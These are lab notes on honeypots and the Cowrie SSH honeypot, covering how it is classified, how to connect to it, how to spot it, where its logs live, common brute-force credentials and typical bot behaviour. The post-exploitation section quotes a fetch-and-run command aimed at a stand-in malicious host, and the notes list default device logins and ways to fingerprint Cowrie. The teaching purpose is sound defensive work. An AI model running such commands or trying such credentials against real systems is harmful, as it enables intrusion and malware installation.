
# Introduction to Honeypots & Cowrie

## 1. What is a Honeypot?

A **honeypot** is a deliberately vulnerable security tool or system intentionally exposed to the internet or internal network. Its primary purpose is to act as bait, attracting malicious actors and recording their actions without exposing actual production assets.

---

## 2. Primary Use Cases

Honeypots serve two major functions in cybersecurity:

* **Defensive Operations:** * **Early Warning System:** Alerts administrators of potential breaches or unauthorized network scanning.
    * **Decoy:** Distracts attackers, wasting their time and resources on fake infrastructure rather than targeting real, high-value assets.
* **Threat Intelligence & Research:**
    * **Data Collection:** Gathers real-time intelligence on the specific tools, tactics, and techniques (TTPs) adversaries are currently using in the wild.
    * **Defensive Engineering:** The recorded data is used to generate effective, up-to-date defensive measures (like new YARA rules, IDS signatures, or firewall blocks).

---

## 3. The Cowrie Honeypot Focus

In this specific scenario, we will be focusing on **Cowrie**, a widely used, medium-to-high interaction SSH and Telnet honeypot. 

**Key areas of upcoming analysis:**
* Viewing Cowrie from both the adversary's and the security researcher's perspective.
* Examining the specific types of data a Cowrie deployment collects.
* Applying analysis methodologies to the gathered data.
* Understanding what this data reveals about typical, automated botnet activity.

<img width="1024" height="559" alt="image" src="https://github.com/user-attachments/assets/0678c535-9fb3-488a-a38c-bf37e79bc760" />


# Honeypot Classification & Deployment

Honeypots are categorized primarily in two ways: by their level of **interactivity** (how "real" the system feels to an attacker) and their physical **deployment location** on the network.

---

## 1. Classification by Interactivity Level

The level of interactivity determines what an adversary can actually do once they connect to the honeypot.

| Level | Description & Capabilities | Examples |
| :--- | :--- | :--- |
| **Low-Interaction** | **The Facade.** Only simulates the bare minimum responses required by a specific service (e.g., an FTP banner). Attackers cannot access an operating system or perform "post-exploitation" activities. | `mailoney`, `dionaea` |
| **Medium-Interaction** | **The Simulation.** Emulates vulnerable services, the underlying OS, shell, and filesystem. Attackers can perform initial exploits and *some* post-exploitation commands, but because it is a simulation, complex actions will fail. | **`Cowrie`** (SSH/Telnet) |
| **High-Interaction** | **The Real Deal.** Fully functional systems (usually VMs) with deliberate vulnerabilities. Attackers can perform almost any action. These carry high risk; they must be tightly managed to prevent attackers from using them as a stepping stone into the real network. | Full VMs, or `Cowrie` acting as a proxy to a real VM. |

---

## 2. Classification by Deployment Location

Where a honeypot is placed dictates the type of threats it detects.

### Internal Honeypots
* **Location:** Deployed inside the local area network (LAN), behind the firewall.
* **Purpose:** To detect threats that have already breached the perimeter. This includes malicious insiders (trusted personnel) or external attackers who slipped past defenses via phishing or other means.
* **Significance:** An alert from an internal honeypot usually indicates a critical, active breach.

### External Honeypots
* **Location:** Deployed directly on the open internet, outside the LAN.
* **Purpose:** To monitor general attack trends from the wild.
* **Significance:** Because they are exposed, they are almost constantly under attack, collecting vast amounts of data on current tools and techniques used by botnets and indiscriminate attackers.


# Cowrie Honeypot: The Adversary Perspective

## 1. Connecting to the Honeypot

Cowrie can operate as either an SSH proxy (forwarding to a real VM) or a simulated shell. In this lab, the target is running the **simulated shell**. It is deliberately configured to allow easy entry.

**Target Credentials:**
* **IP Address:** `IP`
* **Username:** `root`
* **Password:** `<ANY>` *(The honeypot will accept literally any password to lure the attacker inside)*

**Execution:**
```bash
ssh root@IP

```

<img width="723" height="206" alt="image" src="https://github.com/user-attachments/assets/b8d3770e-e8ed-48f4-885f-fefed00adc3d" />


---

## 2. The Illusion (What Looks Real)

At first glance, the emulated environment is highly convincing. It is designed to waste an attacker's time:

* Most standard Linux commands (`ls`, `cd`, `cat`, `pwd`) behave exactly as you would expect.
* The directory structure and files present are designed to perfectly match an empty **Ubuntu 18.04** server installation.

---

## 3. Breaking the Illusion (How to Detect Cowrie)

Because this is a *medium-interaction* simulation and not a real operating system, an observant adversary can perform specific actions to reveal that it is a trap:

* **Execution Limitations:** You cannot execute actual bash scripts. This is a hard limitation of the simulation engine.
* **Default Fingerprints:** If the defender did not customize the deployment, it will mirror a Debian 5 installation and feature a hardcoded default user account named `Phil`.
* **Hardware Anachronisms:** Querying the hardware (such as reading `/proc/cpuinfo`) will reveal references to a very outdated CPU, which is highly suspicious for a modern cloud server.


# Cowrie Event Logging & Aggregation

## 1. Accessing the Real System (The Logs)

While the honeypot runs on the standard SSH port (22) to trap attackers, the *real* underlying system and its logs are accessible via a secondary management port.

**Management Credentials:**
* **IP Address:** `IP`
* **Port:** `1400`
* **Username:** `demo`
* **Password:** `demo`

> [!WARNING] SSH Host Key Conflict
> Because you previously connected to this IP on port 22 (the honeypot), your SSH client might flag a "Remote Host Identification Has Changed" error.
> * **Fix:** Remove the old key from your known hosts file: `ssh-keygen -R IP`
> * **Connection Command:** `ssh demo@IP -p 1400`


---

## 2. Log Location & Analysis Tools

Cowrie tracks every connection, command, and keystroke handled by the system. The logs are stored in both plain text and JSON formats.

**Log Path:**
`/home/cowrie/honeypot/var/log/cowrie`

**Tools Available:**
The system has the **`jq`** JSON parser installed to make reading the structured logs easier.

`ls -l /home/cowrie/honeypot/var/log/cowrie`

<img width="723" height="20" alt="image" src="https://github.com/user-attachments/assets/8b881854-7f03-4077-a1a2-847ce6b0958b" />


---

## 3. Log Aggregation Strategy

For external or high-traffic honeypots, manual log parsing quickly becomes impossible due to volume. 

* **The Solution:** Deploy honeypots alongside a log aggregation platform like the **ELK Stack** (Elasticsearch, Logstash, Kibana).
* **Benefits:**
    * **Scalability:** Handles massive amounts of data from multiple honeypot sensors.
    * **Live Monitoring:** Dashboards allow defenders to see attacks happening in real-time rather than just analyzing them historically.
    * **Alerting:** Can trigger immediate notifications for specific high-risk behaviors.

# SSH Attack Surface & Brute-Force Analysis

## 1. The SSH Attack Surface

By default, Cowrie is configured to only expose the SSH service. Because a properly configured SSH installation has a very limited attack surface, adversaries are almost exclusively forced to rely on **brute-force attacks** to gain entry.

* **The Reality of Exposure:** If you expose SSH to the public internet, it is not a matter of *if* you will be attacked, but *when*. Automated botnets constantly scan the IPv4 space looking for open port 22.
* **Standard Defenses:** Defending against these attacks in the real world is straightforward:
    * Disable password authentication entirely in favor of **Public-Key Authentication (PKI)**.
    * If passwords must be used, enforce complex, high-entropy passwords and implement tools like `fail2ban` to block repeated failed attempts.

---

## 2. Analyzing Common Attacker Credentials

To understand what these automated botnets are actually trying, the demo machine contains a curated list of the **200 most common credentials** captured by historical Cowrie deployments. 

**Common Patterns in the Data:**
When analyzing honeypot credential logs, you will notice distinct trends indicating what attackers are optimizing for:
* **Extremely Weak Passwords:** Standard dictionary words and simple combinations.
* **Keyboard Walks:** Sequential keys like `123456`, `qwerty`, or `asdfgh`.
* **Default IoT/Device Credentials:** Attackers heavily target unconfigured devices connected to the internet. You will frequently see default logins for devices like:
    * **Raspberry Pi:** (`pi:raspberry`)
    * **Volumio Jukebox:** (`volumio:volumio`)
    * Standard default router logins (`admin:admin`, `root:root`).

# Typical Post-Exploitation Activity (Botnets)

**Tags:** #PostExploitation #Botnets #Reconnaissance #MalwareAnalysis #AntiForensics
**Date Logged:** 2026-02-22

---

## 1. The Automated Attack Pattern

Once a bot successfully brute-forces an SSH login, the subsequent actions are almost entirely automated. Because these bots operate via pre-written scripts, their post-exploitation behavior follows a highly predictable, broad pattern that defenders can analyze.

---

## 2. The Three Phases of Bot Behavior

Generally, an automated bot will immediately execute a combination of the following three phases upon gaining access:

### Phase 1: System Reconnaissance
The bot needs to figure out what kind of system it just compromised to determine if its payload will work.
* **Common Commands:** `uname` (kernel info), `nproc` (number of processing units).
* **Target Files:** Reading `/etc/issue` (OS version) and `/proc/cpuinfo` (hardware architecture).
* **The Defender Advantage:** In Cowrie, you can modify the contents of these specific files to trick the bot into thinking it breached a high-end enterprise server, or even a vulnerable IoT device like a smart toaster.

<img width="741" height="125" alt="image" src="https://github.com/user-attachments/assets/00826914-0f1d-4972-ac4e-2e8d3345c6cf" />


### Phase 2: Payload Delivery & Installation
Once the bot confirms the system architecture, it attempts to pull down its primary malicious payload.
* **Common Tools:** `wget`, `curl`, and occasionally `ftp`.
* **Execution Method:** Bots typically pipe a remote shell script directly into bash (e.g., `curl http://malicious.com/payload.sh | sh`).
* **The Payload:** The vast majority of these automated scripts are designed to install cryptocurrency miners.
* **The Defender Advantage:** Cowrie safely intercepts this process. It will successfully download a copy of the malicious file for you to analyze, but it completely prevents the script from actually executing.

### Phase 3: Anti-Forensics (Covering Tracks)
To maintain persistence and hide from system administrators, a subset of bots will attempt to clean up after themselves.
* **Common Actions:** Deleting system logs in `/var/log` and disabling or clearing the `~/.bash_history` file.
* **The Defender Advantage:** This is entirely ineffective in a honeypot. Because Cowrie logs all keystrokes and session data externally (outside the simulated environment), the attacker cannot delete the actual logs of their activity.
